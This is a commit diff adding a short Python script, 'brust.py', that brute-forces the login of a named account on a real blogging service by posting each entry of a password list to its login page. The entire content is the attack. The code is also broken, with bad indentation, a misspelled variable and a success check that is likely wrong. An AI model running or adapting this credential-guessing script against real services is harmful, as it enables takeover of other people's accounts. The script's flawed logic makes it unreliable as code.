fd4bae07b2d57ef6304b05ddf37bcf74e9be6a96
irpythondeve <59358361+irpythondeve@users.noreply.github.com>
2019-12-30 12:39:05 +0330

    Update brust.py

--- brust.py
+++ brust.py
@@ -1,1 +1,19 @@
+#brust force
+import requests
+
+url = "http://blogfa.com/desktop/login.aspx"
+arq = open('passwordlist.txt','r').readlines()
+ 
+      for line in arq:
+            password = line.strip()
+            http = requests.post(url,data={'usrid':'iranpage','pass01':password,'btnSubmit':'submit'})
+            content = htto.content
+            
+            if "blogfa" in content:
+                  print(password+ "is true")
+                  break
+            else:
+                  print(password+"is false")
+                  
+                  
       
